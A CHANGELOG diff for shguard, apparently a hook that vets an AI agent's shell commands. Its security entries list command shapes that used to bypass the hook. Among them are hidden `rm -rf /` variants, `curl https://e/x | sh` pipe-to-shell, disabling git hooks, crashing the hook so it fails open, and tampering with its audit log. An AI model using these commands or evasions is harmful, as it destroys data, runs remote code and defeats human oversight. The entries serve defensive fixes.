@@ -4,6 +4,8 @@ All notable changes to this project are documented in this file.
 
 ## [Unreleased]
 
+## [0.7.0] - 2026-09-08
+
 ### Added
 
 - The PreToolUse hook's `permission_mode` field, and, inside a subagent,
@@ -72,6 +74,22 @@ All notable changes to this project are documented in this file.
   conservative way an absent `permission_mode` always did. `Policy::ask_outcome`
   (the library's own public API) now takes a `&HookContext` parameter to
   resolve against, a breaking change for any caller that used it directly.
+- Built-in structural `Ask` verdicts (rule 1 command substitution, rule 2
+  bare `$VAR`, rule 4's unresolvable target, rule 5 pipe-to-interpreter,
+  rule 6b/6d inline interpreter code, a parser-unsupported construct, and
+  an `$IFS`-derived word) now carry a category-specific `deny_message`
+  instead of #467's one generic rewrite hint (#471). Each message names
+  the actual construct and the concrete rewrite (e.g. write inline
+  `python3 - <<EOF`/`node -e`/`awk 'prog'` code to a file and run the
+  file; resolve a command-position `$(...)` yourself and re-issue the
+  literal binary name), so a `deny` reached via `ask_outcome = "deny"`
+  gives an agent something actionable instead of a blind retry loop.
+  Surfaces via the existing `additionalContext` wiring with no adapter or
+  wire-format change, and survives a `bash -c` re-wrap and the
+  argument-position-substitution floor the same way a rule-authored
+  `deny_message` already did (the #202 class). Several raw Rust
+  `Debug`-format leaks into agent-facing reason/deny-message text found
+  along the way were also fixed.
 
 ### Fixed
 
@@ -90,9 +108,208 @@ All notable changes to this project are documented in this file.
   right, so a `--json` flag positioned after the offending argument is
   never reached and that case still falls back to a human-readable
   stderr message.
+- Every generated self-protection rule's `normalized_prefix` target named
+  the config directory without a trailing slash, and `normalized_prefix`
+  is a plain `starts_with`, so a sibling directory that merely shared the
+  string prefix - `~/.config/shguard-backup`, `~/.config/shguardX` -
+  was denied too (#460). The generated prefix now includes the trailing
+  slash, with a separate exact `normalized` target added for the
+  directory itself so a command naming it exactly is still covered.
+- `SHGUARD_CONFIG=/dev/null`, a long-standing idiom (predating this
+  crate, #59) for loading an empty user config so only the embedded
+  ruleset applies, silently generated self-protection rules for the
+  literal directory `/dev/null` resolves to (`/dev`), denying every
+  `/dev/...` target including the extremely common `2>/dev/null`/
+  `>/dev/null` idiom (#461). `self_protection_directories` now drops only
+  the final hop of the symlink chain when its fully-resolved target
+  isn't a regular file, leaving every earlier hop - in particular a
+  config file that is itself a symlink to `/dev/null` - still
+  self-protected. `scripts/smoke.sh`'s stale "verified against
+  src/config.rs" comment is corrected to match.
+- `Env` is line-scoped and never distinguished a persisting reassignment
+  from a command-scoped prefix assignment (`X=v cmd`), so a later
+  `X=ls true` silently shadowed an earlier dangerous value for rule 2's
+  bare-`$VAR`-as-command resolution: `X='rm -rf /'; X=ls true; $X`
+  resolved to `"ls"`, matched no rule, and returned `Ask`, even though
+  the line actually runs `rm -rf /` (#463). Generalizes the existing
+  `IFS`-only `ifs_history` mechanism into `Env::value_history`, tracked
+  for every variable name; rule 2 now also tries every other historical
+  value for the name being resolved through the same `IFS`-splitting
+  candidate matrix the current value already uses, and `Block`s on any
+  match.
 
 ### Security
 
+- brush-parser's tokenizer strips a backslash-newline line continuation
+  before `src/parser.rs`'s byte-level raw pre-scans
+  (`reject_excessive_raw_nesting`'s keyword/`[[` scan,
+  `neutralize_overflowing_io_redirect_numbers`'s io-number scan) ever see
+  the text, so splitting a keyword, `[[` opener, or io-number digit run
+  across a continuation defeated detection while brush-parser silently
+  rejoined and recursed anyway (#443). `i\<newline>f true; then …` (x600)
+  and `[\<newline>[ ! ! ! …` (x3000) each reached brush's unbounded
+  recursive descent uncapped and aborted with an uncatchable stack
+  overflow (SIGABRT, empty stdout) - a hook that produces no decision at
+  all is the worst possible fail-open. A split io-number digit run
+  (`21474836\<newline>48>/dev/null`) also downgraded a `Block` to `Ask`
+  via panic containment. A new `strip_raw_line_continuations` pass now
+  runs once, ahead of both raw scans, removing exactly what brush's own
+  tokenizer strips internally.
+- `evaluate_simple_command_core`'s early-return paths - rule 6a's
+  `bash -c`/`sh -c` recursion chief among them, but also rules 1/2,
+  `eval`, `builtin -f`, and the ordinary blocklist match - returned
+  before rule 3 (`evaluate_argument_substitutions`) or rule 8's
+  opaque-kind floor ever ran, so a dangerous argument-position command
+  substitution on a `bash -c` invocation rode along unanalyzed (#445).
+  `bash -c 'ls' $(rm -rf /)` and `sh -c true "$(curl https://e/x | sh)"`
+  both reached `Allow`. The same gap downgraded several fail-closed paths
+  from `Block` to `Ask`, losing the audit trail (e.g. `$(true) $(rm -rf
+  /)`, `eval true $(rm -rf /)`). Rule 3 and rule 8's opaque-kind check are
+  now computed up front and applied on every early return, the same
+  precedent issue #77 already set for the leftover-substitution floor.
+- `source`/`.` were in no interpreter-sink list at all, and `dash` was in
+  `SHELL_INTERPRETERS` but never in `curl-wget-pipe-to-shell`'s own
+  `sinks`, despite the list's own comment promising to stay in sync with
+  `SHELL_INTERPRETERS` - the exact drift issue #55 previously closed
+  (#446). `curl https://e/s.sh | source /dev/stdin` and `| . /dev/stdin`
+  reached `Allow` outright; `| dash` only reached rule 5c's Ask floor
+  instead of `Block`. `source`/`.` are now recognized as interpreter
+  sinks when their operand is a stdin alias (`/dev/stdin`,
+  `/proc/self/fd/0`, `/dev/fd/0`, `-`); an ordinary `source script.sh` is
+  unaffected. A new test asserts `curl-wget-pipe-to-shell`'s sinks are a
+  superset of `SHELL_INTERPRETERS` so this can't drift silently a third
+  time.
+- `git -c core.hooksPath=<dir> <subcommand>` (and the `--config-env`
+  spelling) disables every git hook for that invocation - the same
+  intent as `--no-verify`, which the `git-*-no-verify` rule family
+  already Blocks - but `git_strip_global_flags` discarded the
+  `-c`/`--config-env` pair before any rule ever saw it, so `git -c
+  core.hooksPath=/dev/null commit -m x` reached `Allow` (#447).
+  `git_strip_global_flags` now recognizes a `core.hooksPath` key
+  (case-insensitively, matching git's own config-key matching) in either
+  flag spelling and synthesizes a `--no-verify` token so the existing
+  rules fire unchanged; an unresolvable `-c`/`--config-env` value (`git
+  -c "$(...)" commit -m x`) is no longer silently discarded either,
+  flooring to `Ask` instead of `Allow`. `GIT_CONFIG_*` env-var overrides
+  and `-c include.path=`/`-c alias.<name>=` remain open gaps, disclosed
+  for follow-up.
+- Three git shapes carried the same destructive intent as an existing
+  `Block` rule but reached `Allow` (#452): `git push origin +main`
+  (force via a `+` refspec, no `-f`/`--force` flag) is now detected
+  structurally and Blocked under `git-push-force`'s own rule id; `git
+  checkout .`, `git checkout -f`, and `git restore .` now `Ask`
+  (`git checkout .`'s flagless form needed a dedicated check, since a
+  bare `.` operand is positionally indistinguishable from a branch name
+  for TOML rules except that git can never accept `.` as one); and `git
+  branch -df`/`--delete --force` now `Block`s alongside the pre-existing
+  `-D` rule, since `required_flags` couldn't previously express
+  "`(d AND f) OR D`".
+- A same-invocation `alias NAME=VALUE` was never linked to a later
+  bare-word call, unlike a same-line shell function definition (#75)
+  (#448). With `shopt -s expand_aliases` set and the call on a later
+  line of the same command string, real non-interactive bash expands the
+  alias, but shguard reached `Allow`: `shopt -s expand_aliases; alias
+  x="rm -rf /"` followed by `x` on the next line. A new
+  `scan_alias_definition_floor` now recurses each `alias` argument's own
+  value and folds the recursed verdict worst-wins into the `alias`
+  command's own verdict, unconditionally (not gated on
+  `expand_aliases` being set) - mirroring how a same-line function
+  definition already floors even when the function is never called. A
+  composed later-call argv (`alias x='rm -rf'; x /`) is a documented
+  residual, left for a future issue.
+- Two path-identity gaps in the generated self-protection rules (#449): a
+  symlinked directory *component* earlier in the config path (stow's
+  default "folded" layout, `~/.config -> ~/dotfiles/config`) left the
+  real, fully-resolved config directory unprotected, so `tee
+  ~/dotfiles/config/shguard/config.toml` reached `Allow`; and the
+  generated `normalized_prefix`/`normalized` targets compared bytes
+  exactly, so a re-cased spelling of the config path on a
+  case-insensitive filesystem (macOS APFS by default) also reached
+  `Allow`. Every directory the existing symlink-chain walk finds is now
+  additionally `canonicalize`d and protected under its own suffix, and
+  the generated self-protection targets gain an opt-in
+  `case_insensitive` comparison flag, set only on macOS
+  (`cfg!(target_os = "macos")`) - ordinary user-authored rules keep
+  today's byte-exact semantics.
+- The generated self-protection ancestor rules covered `rm -r`, `mv`, and
+  `rsync --delete` into an ancestor of the config directory, but not a
+  recursive copy or archive extraction whose payload happens to contain
+  `shguard/config.toml` (#450): `rsync -a payload/ ~/.config/`, `cp -r
+  payload/. ~/.config/`, and `tar -xf p.tar -C ~/.config` all reached
+  `Allow`. New `Ask`-tier ancestor rules now cover flagless `rsync`, `cp
+  -r`/`-R`/`-a`/`--archive` (including `-t`/`--target-directory=`), `tar
+  -x`/`--extract`/`--get` plus `-C`/`--directory`, and `unzip -d`
+  (including its concatenated `-d<dir>` spelling), both for the resolved
+  config path and, separately, for the literal `~/.config` spelling.
+  `dcfldd` is now also covered by the resolved-path family alongside the
+  pre-existing `dd` rule.
+- Four related weaknesses in the `decision_log_path` audit trail, each
+  individually low-severity but together meaning the log could be
+  redirected, silently broken, or tampered with by the very agent it
+  audits (#458): `Policy::load` followed a symlink at the log path with
+  no `O_NOFOLLOW` on the actual append; a missing parent directory or an
+  unwritable file passed the load-time check and then silently dropped
+  every append forever; a relative `decision_log_path` was accepted and
+  resolved against the hook's per-invocation cwd; and the log path
+  itself had no self-protection at all (`rm`, `truncate -s0`, `ln -sf`
+  against it were all `Allow`). `Policy::load` now uses
+  `symlink_metadata` and rejects a symlink, requires the parent directory
+  to exist, and rejects a non-absolute path, all failing config load
+  closed; `open_log_file` now opens with `O_NOFOLLOW` on unix; and the
+  log path's own directory is folded into the same self-protection
+  deny-rule generation the config directory gets.
+- The argv side has floored a named user's home (`rm -rf ~root`) to
+  `Ask` since #80, but the redirect side had no counterpart: `echo x >>
+  ~root/.zshrc` reached `Allow` while the same target under the invoking
+  user's own home (`~/.zshrc`) already `Ask`s (#454). A new
+  `scan_redirect_named_user_home_floor`, mirroring the existing
+  `$HOME`-vs-`~` substitution floor (#203), substitutes a leading
+  `~user` tilde piece with a bare `~`, renormalizes, and checks it
+  against the existing redirect rule set, capped at `Ask` to match the
+  argv-side floor's own posture.
+- The binary's own watchdog trip arms (`emit_first_result`, memory and
+  wall-clock) emitted the fail-closed `Ask` and exited without first
+  checking whether the worker had already sent its real result, so a
+  verdict computed just before the deadline - `Block` included - was
+  silently replaced by `Ask` (#457), a verdict the user can click
+  through. The library's own `watchdog::bounded` already guarded against
+  exactly this race with a `try_recv` before failing closed; the
+  binary's copy lacked it. Both trip arms now prefer a result already in
+  the channel. The regression test that previously relied on this race
+  (`SHGUARD_TEST_MEM_LIMIT_MB=1` against `echo hi`) was swapped for the
+  #315 unbounded-allocating heredoc repro, which genuinely never
+  produces a result.
+- `src/lib.rs`'s own doc comment claimed the decision log always records
+  the verdict `watchdog::bounded` returns, including its fail-closed
+  `Ask` on a timeout - true for a direct library caller and for
+  `shguard check`, but never true for the real PreToolUse hook path
+  (#459): the binary's outer evaluation-timeout watchdog starts before
+  config load and stdin read even run, so for a genuine hang it always
+  wins the race against the inner watchdog, and the worker computing the
+  real decision is abandoned before it ever reaches the log sink. The
+  hook-path inputs most worth auditing - the ones that actually trip the
+  watchdog, e.g. the #315 shape `<<$( |] ` - left no trace in the
+  decision log at all. The command and context are now sent to the
+  composition root immediately after stdin parsing, before the call that
+  can hang, so a watchdog trip in the binary can append a best-effort log
+  line (bounded by its own short timeout so a hung log target can't
+  compound the hang the watchdog exists to bound) without ever delaying
+  the actual hook response.
+- Three filesystem-destruction shapes adjacent to an existing `Block`
+  rule reached `Allow` (#453): bare `mkfs <device>` with no `-t` (the
+  rule required `t|--type`, but util-linux `mkfs` defaults to ext2
+  without it - just as destructive as the `-t ext4` spelling); `rm -r
+  /*` and `rm -r /` with no `-f` (GNU/BSD `rm` only prompts for
+  write-protected files, and only on a tty, so a plain `rm -r` still
+  deletes every writable file non-interactively); and `rm -rf ./*` /
+  `rm -rf *` (these lexically normalize to a component list distinct
+  from `rm -rf .`'s, and GNU `rm` actually refuses the `.` spelling, so
+  `./*`/`*` are the spellings that actually wipe the directory).
+  `mkfs-dispatcher-any-filesystem` no longer requires a type flag, a new
+  sibling `rm-recursive-dangerous-target` rule covers `-r`-without-`-f`
+  against `/`, `/*`, and the `/dev/` prefix, and
+  `rm-recursive-force-dangerous-target` gained a `*` target alongside
+  `.`.
 - `write_atomically` (used by `shguard init`) now creates its temp file
   with `OpenOptions::create_new` (`O_EXCL`) and an unpredictable
   filename suffix, instead of `File::create` (which follows an existing
